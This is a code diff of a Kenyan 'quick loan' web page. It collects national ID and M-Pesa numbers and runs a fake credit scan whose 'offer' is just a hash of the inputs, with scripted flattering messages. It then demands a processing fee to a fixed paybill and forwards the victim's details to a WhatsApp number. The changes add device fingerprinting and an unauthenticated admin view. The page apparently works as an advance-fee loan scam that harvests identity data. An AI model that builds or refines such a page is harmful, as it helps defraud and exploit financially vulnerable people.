@@ -89,6 +89,12 @@
             display: none;
         }
         
+        .id-hint {
+            color: #64748b;
+            font-size: 0.85em;
+            margin-top: 5px;
+        }
+        
         .verification-notice {
             background: #fef3c7;
             border: 1px solid #fde68a;
@@ -458,7 +464,6 @@
             transition: all 0.3s;
             font-weight: 500;
             font-size: 0.9em;
-            cursor: pointer;
         }
         
         .lender-link:hover {
@@ -654,6 +659,10 @@
             color: #0B4F6C;
         }
         
+        .copy-btn.copied {
+            color: #10b981;
+        }
+        
         .copy-feedback {
             position: fixed;
             bottom: 20px;
@@ -664,8 +673,15 @@
             border-radius: 50px;
             font-size: 0.9em;
             box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1);
+            animation: fadeInOut 2s ease;
             z-index: 2000;
-            display: none;
+        }
+        
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translateY(20px); }
+            15% { opacity: 1; transform: translateY(0); }
+            85% { opacity: 1; transform: translateY(0); }
+            100% { opacity: 0; transform: translateY(-20px); }
         }
         
         .mpesa-instructions {
@@ -846,12 +862,14 @@
         <div class="form-section">
             <div class="form-group">
                 <label>National ID Number</label>
-                <input type="text" id="idNumber" placeholder="e.g., 12345678" maxlength="8">
+                <input type="text" id="idNumber" placeholder="Enter your ID number (numbers only)" oninput="validateIdNumber(); checkExistingUser()">
+                <div class="id-hint">Enter your Kenyan ID number (numbers only, any length)</div>
+                <div class="validation-message" id="idValidation">Please enter numbers only</div>
             </div>
             
             <div class="form-group">
                 <label>M-Pesa Registered Number</label>
-                <input type="tel" id="phoneNumber" placeholder="e.g., 0712345678" maxlength="10">
+                <input type="tel" id="phoneNumber" placeholder="e.g., 0712345678" maxlength="10" oninput="validatePhoneNumber(); checkExistingUser()">
                 <div class="validation-message" id="phoneValidation">Please enter a valid Kenyan phone number (07... or 01...)</div>
             </div>
             
@@ -891,7 +909,7 @@
                 <div class="credit-score-text" id="creditMessage">Based on your financial profile</div>
                 
                 <!-- Fair & Flexible Loan Terms Card -->
-                <div class="loan-terms-card">
+                <div class="loan-terms-card" id="loanTermsCard">
                     <h4>📋 Your Flexible Loan Terms</h4>
                     
                     <div class="terms-grid">
@@ -901,7 +919,7 @@
                         </div>
                         <div class="term-item">
                             <div class="term-label">Max Tenure</div>
-                            <div class="term-value">12 months</div>
+                            <div class="term-value" id="maxTenure">12 months</div>
                         </div>
                         <div class="term-item">
                             <div class="term-label">Early Repayment</div>
@@ -922,7 +940,7 @@
                         </div>
                     </div>
                     
-                    <div class="repayment-summary">
+                    <div class="repayment-summary" id="repaymentSummary">
                         <div class="summary-row">
                             <span class="label">Monthly Installment</span>
                             <span class="value" id="monthlyPayment">KSh 0</span>
@@ -958,7 +976,7 @@
         </div>
         
         <div class="tnc-accept" id="tncAcceptSection">
-            <input type="checkbox" id="acceptTnc">
+            <input type="checkbox" id="acceptTnc" onchange="toggleApplyButton()">
             <label for="acceptTnc">I have read and accept the Terms & Conditions</label>
         </div>
         
@@ -970,12 +988,12 @@
         <div class="lenders-bar">
             <h3>Other Lenders in Kenya</h3>
             <div class="lenders-list">
-                <a href="#" class="lender-link" onclick="openLenderSite('LendPlus'); return false;">LendPlus</a>
-                <a href="#" class="lender-link" onclick="openLenderSite('Branch'); return false;">Branch</a>
-                <a href="#" class="lender-link" onclick="openLenderSite('Tala'); return false;">Tala</a>
-                <a href="#" class="lender-link" onclick="openLenderSite('Zenka'); return false;">Zenka</a>
-                <a href="#" class="lender-link" onclick="openLenderSite('KCB M-Pesa'); return false;">KCB M-Pesa</a>
-                <a href="#" class="lender-link" onclick="openLenderSite('M-Shwari'); return false;">M-Shwari</a>
+                <a href="#" class="lender-link" onclick="openLenderSite('LendPlus')">LendPlus</a>
+                <a href="#" class="lender-link" onclick="openLenderSite('Branch')">Branch</a>
+                <a href="#" class="lender-link" onclick="openLenderSite('Tala')">Tala</a>
+                <a href="#" class="lender-link" onclick="openLenderSite('Zenka')">Zenka</a>
+                <a href="#" class="lender-link" onclick="openLenderSite('KCB M-Pesa')">KCB M-Pesa</a>
+                <a href="#" class="lender-link" onclick="openLenderSite('M-Shwari')">M-Shwari</a>
             </div>
         </div>
     </div>
@@ -985,7 +1003,7 @@
         <p>Contact: <a href="mailto:support@scbquickloans.co.ke">support@scbquickloans.co.ke</a></p>
     </div>
     
-    <!-- Payment Modal -->
+    <!-- Enhanced Payment Modal with Copy Functionality -->
     <div class="modal" id="paymentModal">
         <div class="modal-content">
             <div class="modal-header">
@@ -994,12 +1012,14 @@
                 <p>Pay the processing fee to activate your loan</p>
             </div>
             <div class="modal-body">
+                <!-- Payment Summary -->
                 <div class="payment-summary">
                     <div class="label">Processing Fee Amount</div>
                     <div class="amount" id="modalPaymentAmount">KSh 0</div>
                     <div class="description">One-time fee for credit assessment & verification</div>
                 </div>
                 
+                <!-- Bank Details with Copy Buttons -->
                 <div class="bank-details-grid">
                     <div class="detail-row">
                         <div class="detail-label">
@@ -1007,8 +1027,10 @@
                             <span>Paybill</span>
                         </div>
                         <div class="detail-value">
-                            <span class="value-text">329329</span>
-                            <button class="copy-btn" onclick="copyToClipboard('329329', 'Paybill')">📋 Copy</button>
+                            <span class="value-text" id="paybillValue">329329</span>
+                            <button class="copy-btn" onclick="copyToClipboard('329329', 'Paybill')">
+                                📋 Copy
+                            </button>
                         </div>
                     </div>
                     
@@ -1018,8 +1040,10 @@
                             <span>Account No.</span>
                         </div>
                         <div class="detail-value">
-                            <span class="value-text">0100400609500</span>
-                            <button class="copy-btn" onclick="copyToClipboard('0100400609500', 'Account number')">📋 Copy</button>
+                            <span class="value-text" id="accountValue">0100400609500</span>
+                            <button class="copy-btn" onclick="copyToClipboard('0100400609500', 'Account number')">
+                                📋 Copy
+                            </button>
                         </div>
                     </div>
                     
@@ -1030,23 +1054,45 @@
                         </div>
                         <div class="detail-value">
                             <span class="value-text" id="amountValue">KSh <span id="copyAmount">0</span></span>
-                            <button class="copy-btn" onclick="copyAmountToClipboard()">📋 Copy</button>
+                            <button class="copy-btn" id="copyAmountBtn" onclick="copyAmountToClipboard()">
+                                📋 Copy
+                            </button>
                         </div>
                     </div>
                 </div>
                 
+                <!-- M-Pesa Instructions -->
                 <div class="mpesa-instructions">
                     <h4>📱 How to Pay via M-Pesa</h4>
                     <ul class="steps">
-                        <li><span class="step-number">1</span><span>Go to M-Pesa on your phone</span></li>
-                        <li><span class="step-number">2</span><span>Select <strong>Lipa Na M-Pesa</strong> → <strong>Paybill</strong></span></li>
-                        <li><span class="step-number">3</span><span>Enter <strong>Business No: 329329</strong></span></li>
-                        <li><span class="step-number">4</span><span>Enter <strong>Account No: 0100400609500</strong></span></li>
-                        <li><span class="step-number">5</span><span>Enter <strong>Amount: <span id="instructionAmount">KSh 0</span></strong></span></li>
-                        <li><span class="step-number">6</span><span>Enter your M-Pesa PIN and confirm</span></li>
+                        <li>
+                            <span class="step-number">1</span>
+                            <span>Go to M-Pesa on your phone</span>
+                        </li>
+                        <li>
+                            <span class="step-number">2</span>
+                            <span>Select <strong>Lipa Na M-Pesa</strong> → <strong>Paybill</strong></span>
+                        </li>
+                        <li>
+                            <span class="step-number">3</span>
+                            <span>Enter <strong>Business No: 329329</strong> (click copy above)</span>
+                        </li>
+                        <li>
+                            <span class="step-number">4</span>
+                            <span>Enter <strong>Account No: 0100400609500</strong> (click copy above)</span>
+                        </li>
+                        <li>
+                            <span class="step-number">5</span>
+                            <span>Enter <strong>Amount: <span id="instructionAmount">KSh 0</span></strong></span>
+                        </li>
+                        <li>
+                            <span class="step-number">6</span>
+                            <span>Enter your M-Pesa PIN and confirm</span>
+                        </li>
                     </ul>
                 </div>
                 
+                <!-- M-Pesa Reference Input -->
                 <div class="mpesa-input-area">
                     <label>ENTER M-PESA CONFIRMATION CODE</label>
                     <input type="text" id="mpesaCode" placeholder="e.g., PPC13P0ZJ9" maxlength="10">
@@ -1055,7 +1101,9 @@
                     </p>
                 </div>
                 
-                <button class="verify-btn" onclick="submitForApproval()">SUBMIT FOR VERIFICATION</button>
+                <button class="verify-btn" onclick="submitForApproval()">
+                    SUBMIT FOR VERIFICATION
+                </button>
                 
                 <div class="verification-notice" style="margin-top: 15px;">
                     <p style="margin: 0;">Your application will be verified within 5-10 minutes. You'll be notified once approved.</p>
@@ -1064,58 +1112,63 @@
         </div>
     </div>
     
-    <!-- Admin Panel -->
+    <!-- Admin Panel - Hidden -->
     <div class="admin-panel" id="adminPanel">
         <h3>Applications Dashboard</h3>
         <div class="applications-list" id="applicationsList"></div>
     </div>
-    
+
     <!-- Copy Feedback Toast -->
-    <div class="copy-feedback" id="copyFeedback">Copied to clipboard!</div>
+    <div id="copyFeedback" class="copy-feedback" style="display: none;">Copied to clipboard!</div>
 
     <script>
-        // ================ Initialize Everything When Page Loads ================
-        document.addEventListener('DOMContentLoaded', function() {
-            console.log('SCB Quick Loans - System Initialized');
+        // ================ FIXED: Consistent User Identification ================
+        
+        // Generate a persistent device fingerprint
+        function generateDeviceFingerprint() {
+            let fingerprint = localStorage.getItem('scb_device_fingerprint');
             
-            // Check for admin access
-            if (window.location.hash === '#admin') {
-                document.getElementById('adminPanel').classList.add('visible');
-                loadApplications();
+            if (!fingerprint) {
+                const navigator = window.navigator;
+                const screen = window.screen;
+                
+                const components = [
+                    navigator.userAgent,
+                    navigator.language,
+                    screen.colorDepth,
+                    screen.width + 'x' + screen.height,
+                    new Date().getTimezoneOffset(),
+                    navigator.hardwareConcurrency || 'unknown'
+                ];
+                
+                const fingerprintString = components.join('|||');
+                let hash = 0;
+                for (let i = 0; i < fingerprintString.length; i++) {
+                    hash = ((hash << 5) - hash) + fingerprintString.charCodeAt(i);
+                    hash = hash & hash;
+                }
+                
+                fingerprint = 'DEV-' + Math.abs(hash).toString(36).substr(0, 8).toUpperCase();
+                localStorage.setItem('scb_device_fingerprint', fingerprint);
             }
             
-            // Set up event listeners
-            document.getElementById('idNumber').addEventListener('input', function() {
-                checkScanEligibility();
-                checkExistingUser();
-            });
-            
-            document.getElementById('phoneNumber').addEventListener('input', function() {
-                validatePhoneNumber();
-                checkScanEligibility();
-                checkExistingUser();
-            });
-            
-            document.getElementById('consentCheckbox').addEventListener('change', checkScanEligibility);
-            document.getElementById('acceptTnc').addEventListener('change', toggleApplyButton);
-            
-            // Auto-fill sample M-Pesa code for demo
-            document.getElementById('mpesaCode').addEventListener('focus', function() {
-                if (!this.value) {
-                    this.value = generateMpesaCode();
-                }
-            });
-            
-            // Clear session
-            sessionStorage.removeItem('hasScanned');
-        });
+            return fingerprint;
+        }
 
-        // ================ FIXED: Persistent User Database ================
-        
-        // Initialize user database
+        // User database for cross-device consistency
         let userDatabase = JSON.parse(localStorage.getItem('scb_user_database')) || {};
+        const deviceFingerprint = generateDeviceFingerprint();
         
-        // Fixed loan options (consistent mapping)
+        let currentUserKey = null;
+        let currentUserData = null;
+        let qualifiedAmount = 0;
+        let processingFee = 0;
+        let interestRate = 0.09;
+        let selectedTenure = 3;
+        let isScanning = false;
+        let scanInterval;
+        
+        // Fixed loan options
         const loanOptions = [
             { amount: 10000, fee: 200, rate: 0.09 },
             { amount: 15000, fee: 300, rate: 0.09 },
@@ -1134,71 +1187,155 @@
             { amount: 100000, fee: 2000, rate: 0.065 }
         ];
         
-        // Applications storage
         let applications = JSON.parse(localStorage.getItem('scb_applications')) || [];
         
-        // Current user data
-        let qualifiedAmount = 0;
-        let processingFee = 0;
-        let interestRate = 0.09;
-        let selectedTenure = 3;
-        let isScanning = false;
-        let scanInterval;
+        // Migrate old applications
+        applications = applications.map(app => {
+            if (!app.userKey) {
+                app.userKey = `user_${app.idNumber}_${app.phoneNumber}`;
+            }
+            return app;
+        });
+        localStorage.setItem('scb_applications', JSON.stringify(applications));
 
-        // ================ FIXED: Generate Consistent User Key ================
+        // ================ FIXED: Validation Functions ================
         
-        function generateUserKey(id, phone) {
-            return `user_${id}_${phone}`;
+        // Validate ID number (numbers only, any length)
+        function validateIdNumber() {
+            const idInput = document.getElementById('idNumber');
+            const idValue = idInput.value;
+            const validationMsg = document.getElementById('idValidation');
+            
+            // Remove any non-numeric characters
+            const numericValue = idValue.replace(/[^0-9]/g, '');
+            if (idValue !== numericValue) {
+                idInput.value = numericValue;
+            }
+            
+            // Show warning if non-numbers were entered
+            if (idValue.length > 0 && idValue !== numericValue) {
+                validationMsg.style.display = 'block';
+            } else {
+                validationMsg.style.display = 'none';
+            }
+            
+            checkScanEligibility();
+            return true; // Always return true as long as we cleaned it
         }
         
-        function getConsistentLoanIndex(id, phone) {
-            // Create a hash from ID and phone that's the same on all devices
-            const str = id + phone;
+        // Validate phone number (must be 07... or 01...)
+        function validatePhoneNumber() {
+            const phoneInput = document.getElementById('phoneNumber');
+            const phone = phoneInput.value;
+            const validationMsg = document.getElementById('phoneValidation');
+            
+            // Remove any non-numeric characters
+            const numericPhone = phone.replace(/[^0-9]/g, '');
+            if (phone !== numericPhone) {
+                phoneInput.value = numericPhone;
+            }
+            
+            const isValid = /^(07|01)\d{8}$/.test(numericPhone);
+            
+            if (numericPhone.length > 0 && !isValid) {
+                phoneInput.classList.add('error');
+                validationMsg.style.display = 'block';
+            } else {
+                phoneInput.classList.remove('error');
+                validationMsg.style.display = 'none';
+            }
+            
+            checkScanEligibility();
+            return isValid;
+        }
+        
+        // Check scan eligibility
+        function checkScanEligibility() {
+            const idNumber = document.getElementById('idNumber').value.trim();
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            const consentGiven = document.getElementById('consentCheckbox').checked;
+            const scanBtn = document.getElementById('scanBtn');
+            const isValidPhone = /^(07|01)\d{8}$/.test(phoneNumber);
+            
+            // Only require that ID has at least 1 number and phone is valid
+            scanBtn.disabled = !(idNumber.length > 0 && phoneNumber.length > 0 && consentGiven && isValidPhone);
+        }
+
+        // ================ FIXED: User Identity Functions ================
+        
+        // Generate consistent hash
+        function generateConsistentHash(input) {
             let hash = 0;
-            for (let i = 0; i < str.length; i++) {
-                hash = ((hash << 5) - hash) + str.charCodeAt(i);
+            for (let i = 0; i < input.length; i++) {
+                const char = input.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
                 hash = hash & hash;
             }
-            return Math.abs(hash) % loanOptions.length;
+            return Math.abs(hash);
         }
         
-        function getUserLoanData(id, phone) {
-            const userKey = generateUserKey(id, phone);
+        // Get or create user identity
+        function getUserIdentity(idNumber, phoneNumber) {
+            if (!idNumber || !phoneNumber) return null;
             
-            // Check if user exists in database
+            const userKey = `user_${idNumber}_${phoneNumber}`;
+            
+            // Check if we've seen this user before
             if (userDatabase[userKey]) {
                 console.log('Returning user found:', userKey);
+                // Add this device to the user's device list if not already there
+                if (!userDatabase[userKey].devices.includes(deviceFingerprint)) {
+                    userDatabase[userKey].devices.push(deviceFingerprint);
+                    localStorage.setItem('scb_user_database', JSON.stringify(userDatabase));
+                }
                 return userDatabase[userKey];
             }
             
             // New user - create consistent loan offer
-            console.log('New user, creating offer for:', userKey);
-            const index = getConsistentLoanIndex(id, phone);
-            const loanData = { ...loanOptions[index] };
+            console.log('New user, creating consistent offer for:', userKey);
+            
+            // Generate a consistent index based on ID+phone
+            const hash = generateConsistentHash(idNumber + phoneNumber);
+            const loanIndex = hash % loanOptions.length;
+            const loanData = { ...loanOptions[loanIndex] };
             
             // Add metadata
-            loanData.createdAt = new Date().toISOString();
-            loanData.idNumber = id;
-            loanData.phoneNumber = phone;
+            loanData.userKey = userKey;
+            loanData.firstSeen = new Date().toISOString();
+            loanData.devices = [deviceFingerprint];
+            loanData.idNumber = idNumber;
+            loanData.phoneNumber = phoneNumber;
             
-            // Save to database
+            // Store in database
             userDatabase[userKey] = loanData;
             localStorage.setItem('scb_user_database', JSON.stringify(userDatabase));
             
             return loanData;
         }
-
-        // ================ Check Existing User ================
         
+        // Check existing user and application
         function checkExistingUser() {
             const idNumber = document.getElementById('idNumber').value.trim();
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
             
             if (!idNumber || !phoneNumber) return;
             
-            const userKey = generateUserKey(idNumber, phoneNumber);
+            // Get or create user identity (this ensures consistency)
+            const userData = getUserIdentity(idNumber, phoneNumber);
+            
+            if (userData) {
+                // Set the loan amounts from the stored user data
+                qualifiedAmount = userData.amount;
+                processingFee = userData.fee;
+                interestRate = userData.rate;
+                
+                // Store for later use
+                currentUserKey = `user_${idNumber}_${phoneNumber}`;
+                currentUserData = userData;
+            }
             
             // Find any applications for this user
+            const userKey = `user_${idNumber}_${phoneNumber}`;
             const existingApps = applications.filter(app => app.userKey === userKey);
             const latestApp = existingApps.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0];
             
@@ -1233,49 +1370,29 @@
                     document.getElementById('statusText').innerHTML = 
                         `Your loan of KSh ${latestApp.amount.toLocaleString()} has been approved.<br>
                         <strong>Disbursement:</strong> Waiting to be sent to ${latestApp.phoneNumber}<br>
-                        <strong>Reference:</strong> ${latestApp.mpesaRef}`;
+                        <strong>Reference:</strong> ${latestApp.mpesaRef}<br>
+                        <strong>Approved:</strong> ${new Date(latestApp.lastUpdated || latestApp.timestamp).toLocaleString()}`;
                 }
             } else {
-                // Show normal interface
+                // New user or no application yet
                 scanSection.style.display = 'block';
                 tncSection.style.display = 'block';
                 tncAcceptSection.style.display = 'block';
                 applyBtn.style.display = 'block';
                 statusMessage.style.display = 'none';
+                
+                // If we have user data, pre-fill the result card if they've scanned before
+                if (userData && sessionStorage.getItem('hasScanned') === 'true') {
+                    document.getElementById('qualifiedAmount').textContent = `KSh ${userData.amount.toLocaleString()}`;
+                    document.getElementById('feeAmount').textContent = userData.fee.toLocaleString();
+                    document.getElementById('interestRate').textContent = (userData.rate * 100) + '%';
+                    resultCard.classList.add('visible');
+                    updateRepaymentTerms();
+                }
             }
         }
 
-        // ================ Validation Functions ================
-        
-        function validatePhoneNumber() {
-            const phoneInput = document.getElementById('phoneNumber');
-            const phone = phoneInput.value.trim();
-            const validationMsg = document.getElementById('phoneValidation');
-            
-            const isValid = /^(07|01)\d{8}$/.test(phone);
-            
-            if (phone.length > 0 && !isValid) {
-                phoneInput.classList.add('error');
-                validationMsg.style.display = 'block';
-            } else {
-                phoneInput.classList.remove('error');
-                validationMsg.style.display = 'none';
-            }
-            
-            return isValid;
-        }
-        
-        function checkScanEligibility() {
-            const idNumber = document.getElementById('idNumber').value.trim();
-            const phoneNumber = document.getElementById('phoneNumber').value.trim();
-            const consentGiven = document.getElementById('consentCheckbox').checked;
-            const scanBtn = document.getElementById('scanBtn');
-            const isValidPhone = /^(07|01)\d{8}$/.test(phoneNumber);
-            
-            scanBtn.disabled = !(idNumber && phoneNumber && consentGiven && isValidPhone);
-        }
-
-        // ================ Scanning Functions ================
+        // ================ FIXED: Scanning Functions ================
         
         function startScanning() {
             if (isScanning) return;
@@ -1283,17 +1400,22 @@
             const idNumber = document.getElementById('idNumber').value.trim();
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
             
-            if (!validatePhoneNumber()) {
-                alert('Please enter a valid Kenyan phone number');
+            // Get or create user data (this ensures consistency)
+            const userData = getUserIdentity(idNumber, phoneNumber);
+            
+            if (!userData) {
+                alert('Please enter valid ID and phone number');
                 return;
             }
             
-            // Get consistent loan data for this user
-            const userData = getUserLoanData(idNumber, phoneNumber);
-            
+            // Set the loan amounts from user data
             qualifiedAmount = userData.amount;
             processingFee = userData.fee;
             interestRate = userData.rate;
+            
+            // Store current user info
+            currentUserKey = `user_${idNumber}_${phoneNumber}`;
+            currentUserData = userData;
             
             const scanBtn = document.getElementById('scanBtn');
             const resultCard = document.getElementById('resultCard');
@@ -1307,9 +1429,17 @@
             let seconds = 0;
             scanInterval = setInterval(() => {
                 seconds++;
+                const messages = [
+                    'Verifying ID details',
+                    'Checking M-Pesa statements',
+                    'Analyzing transaction history',
+                    'Calculating credit score',
+                    'Preparing fair terms'
+                ];
                 
                 if (seconds <= 10) {
-                    scanBtn.innerHTML = `<span class="spinner"></span> ANALYZING... ${seconds * 10}%`;
+                    const messageIndex = Math.min(seconds - 1, messages.length - 1);
+                    scanBtn.innerHTML = `<span class="spinner"></span> ${messages[messageIndex]}... ${seconds * 10}%`;
                 }
                 
                 if (seconds >= 10) {
@@ -1324,21 +1454,25 @@
             document.getElementById('scanBtn').disabled = false;
             isScanning = false;
             
+            // Update display with consistent user data
             document.getElementById('qualifiedAmount').textContent = `KSh ${qualifiedAmount.toLocaleString()}`;
             document.getElementById('feeAmount').textContent = processingFee.toLocaleString();
             document.getElementById('interestRate').textContent = (interestRate * 100) + '%';
             
+            // Personalized message based on user hash
+            const idNumber = document.getElementById('idNumber').value.trim();
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            const hash = generateConsistentHash(idNumber + phoneNumber);
+            
             const messages = [
                 'Based on your financial behavior, you qualify for fair terms',
                 'Your credit profile shows responsible financial management',
-                'You\'ve been pre-approved with flexible repayment options'
+                'You\'ve been pre-approved with flexible repayment options',
+                'We\'ve tailored these terms specifically for you',
+                'Your consistent financial history qualifies you for this offer'
             ];
             
-            const idNumber = document.getElementById('idNumber').value.trim();
-            const phoneNumber = document.getElementById('phoneNumber').value.trim();
-            const hash = (idNumber + phoneNumber).length % messages.length;
-            
-            document.getElementById('creditMessage').textContent = messages[hash];
+            document.getElementById('creditMessage').textContent = messages[hash % messages.length];
             
             document.getElementById('resultCard').classList.add('visible');
             
@@ -1374,14 +1508,12 @@
             
             applyBtn.disabled = !(acceptTnc.checked && hasScanned && qualifiedAmount > 0);
         }
-
-        // ================ Modal Functions ================
         
         function openPaymentModal() {
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
             
             if (!/^(07|01)\d{8}$/.test(phoneNumber)) {
-                alert('Please enter a valid Kenyan phone number');
+                alert('Please enter a valid Kenyan phone number starting with 07 or 01');
                 return;
             }
             
@@ -1410,31 +1542,6 @@
             return code;
         }
         
-        function copyToClipboard(text, type) {
-            navigator.clipboard.writeText(text).then(function() {
-                const feedback = document.getElementById('copyFeedback');
-                feedback.textContent = `${type} copied!`;
-                feedback.style.display = 'block';
-                setTimeout(() => {
-                    feedback.style.display = 'none';
-                }, 2000);
-            });
-        }
-        
-        function copyAmountToClipboard() {
-            const amount = document.getElementById('copyAmount').textContent;
-            navigator.clipboard.writeText(amount).then(function() {
-                const feedback = document.getElementById('copyFeedback');
-                feedback.textContent = 'Amount copied!';
-                feedback.style.display = 'block';
-                setTimeout(() => {
-                    feedback.style.display = 'none';
-                }, 2000);
-            });
-        }
-
-        // ================ Submit Application ================
-        
         function submitForApproval() {
             const mpesaCode = document.getElementById('mpesaCode').value.trim().toUpperCase();
             
@@ -1445,11 +1552,20 @@
             
             const idNumber = document.getElementById('idNumber').value.trim();
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
-            const userKey = generateUserKey(idNumber, phoneNumber);
             
+            // Ensure we have the user data
+            const userData = getUserIdentity(idNumber, phoneNumber);
+            
+            if (!userData) {
+                alert('Error: User data not found. Please try again.');
+                return;
+            }
+            
+            // Create application with user key
             const application = {
                 id: 'APP-' + Date.now() + '-' + Math.random().toString(36).substr(2, 5).toUpperCase(),
-                userKey: userKey,
+                userKey: `user_${idNumber}_${phoneNumber}`,
+                visitorId: deviceFingerprint,
                 idNumber: idNumber,
                 phoneNumber: phoneNumber,
                 amount: qualifiedAmount,
@@ -1463,8 +1579,22 @@
             applications.push(application);
             localStorage.setItem('scb_applications', JSON.stringify(applications));
             
+            // Update user data with application reference
+            userData.lastApplication = application.id;
+            userData.lastApplicationDate = new Date().toISOString();
+            localStorage.setItem('scb_user_database', JSON.stringify(userDatabase));
+            
             // WhatsApp notification
-            const message = `NEW APPLICATION\nID: ${idNumber}\nPhone: ${phoneNumber}\nAmount: KSh ${qualifiedAmount}\nRef: ${mpesaCode}`;
+            const message = `🔔 NEW APPLICATION\n\n` +
+                `User Key: ${application.userKey}\n` +
+                `ID: ${idNumber}\n` +
+                `Phone: ${phoneNumber}\n` +
+                `Loan: KSh ${qualifiedAmount.toLocaleString()}\n` +
+                `Fee: KSh ${processingFee.toLocaleString()}\n` +
+                `Ref: ${mpesaCode}\n` +
+                `Tenure: ${selectedTenure} months\n` +
+                `Time: ${new Date().toLocaleString()}`;
+            
             window.open(`https://wa.me/254715365500?text=${encodeURIComponent(message)}`, '_blank');
             
             closePaymentModal();
@@ -1482,6 +1612,7 @@
             document.getElementById('statusText').innerHTML = 
                 `Your application for KSh ${qualifiedAmount.toLocaleString()} is being verified.<br>
                 <strong>Reference:</strong> ${mpesaCode}<br>
+                <strong>Applied:</strong> ${new Date().toLocaleString()}<br>
                 You will be notified once processed.`;
             
             // Clear form
@@ -1491,8 +1622,8 @@
             document.getElementById('acceptTnc').checked = false;
             sessionStorage.removeItem('hasScanned');
         }
-
-        // ================ Admin Functions ================
+        
+        // ================ FIXED: Admin Functions ================
         
         function loadApplications() {
             const appsList = document.getElementById('applicationsList');
@@ -1500,19 +1631,31 @@
             
             applications.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
             
+            if (applications.length === 0) {
+                appsList.innerHTML = '<p style="text-align: center; padding: 20px;">No applications yet</p>';
+                return;
+            }
+            
             applications.forEach(app => {
+                const userData = userDatabase[app.userKey] || {};
+                const deviceCount = userData.devices ? userData.devices.length : 1;
+                
                 const appElement = document.createElement('div');
                 appElement.className = `application-item ${app.status}`;
                 appElement.innerHTML = `
+                    <div><strong>User Key:</strong> ${app.userKey}</div>
                     <div><strong>ID:</strong> ${app.idNumber}</div>
                     <div><strong>Phone:</strong> ${app.phoneNumber}</div>
-                    <div><strong>Amount:</strong> KSh ${app.amount.toLocaleString()}</div>
+                    <div><strong>Loan:</strong> KSh ${app.amount.toLocaleString()}</div>
+                    <div><strong>Fee:</strong> KSh ${app.fee.toLocaleString()}</div>
                     <div><strong>Ref:</strong> ${app.mpesaRef}</div>
+                    <div><strong>Tenure:</strong> ${app.tenure || 3} months</div>
+                    <div><strong>Devices:</strong> ${deviceCount}</div>
                     <div><strong>Time:</strong> ${new Date(app.timestamp).toLocaleString()}</div>
                     <div class="admin-actions">
                         ${app.status === 'pending' ? 
-                            `<button class="admin-btn approve" onclick="approveApplication('${app.id}')">Approve</button>` : 
-                            '<span style="color: #10b981;">✓ Approved</span>'}
+                            `<button class="admin-btn approve" onclick="approveApplication('${app.id}')">✅ Approve & Disburse</button>` : 
+                            '<span style="color: #10b981;">✓ Approved - Waiting Disbursement</span>'}
                     </div>
                 `;
                 appsList.appendChild(appElement);
@@ -1525,22 +1668,84 @@
                 applications[appIndex].status = 'approved';
                 applications[appIndex].lastUpdated = new Date().toISOString();
                 localStorage.setItem('scb_applications', JSON.stringify(applications));
-                alert('Application approved');
+                
+                alert(`Application ${applicationId} approved. Funds will be disbursed.`);
                 loadApplications();
             }
+        }
+        
+        // ================ FIXED: Utility Functions ================
+        
+        function copyToClipboard(text, type) {
+            navigator.clipboard.writeText(text).then(function() {
+                showCopyFeedback(`${type} copied!`);
+            });
+        }
+        
+        function copyAmountToClipboard() {
+            const amount = document.getElementById('copyAmount').textContent;
+            navigator.clipboard.writeText(amount).then(function() {
+                showCopyFeedback('Amount copied!');
+            });
+        }
+        
+        function showCopyFeedback(message) {
+            const feedback = document.getElementById('copyFeedback');
+            feedback.textContent = message;
+            feedback.style.display = 'block';
+            setTimeout(() => feedback.style.display = 'none', 2000);
         }
         
         function openLenderSite(lender) {
             alert(`${lender} - Compare their rates with our fair terms`);
         }
         
+        function checkAdminAccess() {
+            if (window.location.hash === '#admin') {
+                document.getElementById('adminPanel').classList.add('visible');
+                loadApplications();
+            }
+        }
+        
         // Close modal when clicking outside
         window.onclick = function(event) {
             const modal = document.getElementById('paymentModal');
-            if (event.target === modal) {
-                closePaymentModal();
-            }
+            if (event.target === modal) closePaymentModal();
         }
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Set up input listeners
+            document.getElementById('idNumber').addEventListener('input', function() {
+                validateIdNumber();
+                checkExistingUser();
+            });
+            
+            document.getElementById('phoneNumber').addEventListener('input', function() {
+                validatePhoneNumber();
+                checkExistingUser();
+            });
+            
+            document.getElementById('consentCheckbox').addEventListener('change', checkScanEligibility);
+            document.getElementById('acceptTnc').addEventListener('change', toggleApplyButton);
+            
+            // Auto-fill sample M-Pesa code for demo
+            const mpesaInput = document.getElementById('mpesaCode');
+            if (mpesaInput) {
+                mpesaInput.addEventListener('focus', function() {
+                    if (!this.value) this.value = generateMpesaCode();
+                });
+            }
+            
+            // Check admin access
+            checkAdminAccess();
+            window.addEventListener('hashchange', checkAdminAccess);
+            
+            // Clear scan session
+            sessionStorage.removeItem('hasScanned');
+            
+            console.log('Device Fingerprint:', deviceFingerprint);
+        });
     </script>
 </body>
-</html>
+    </html>
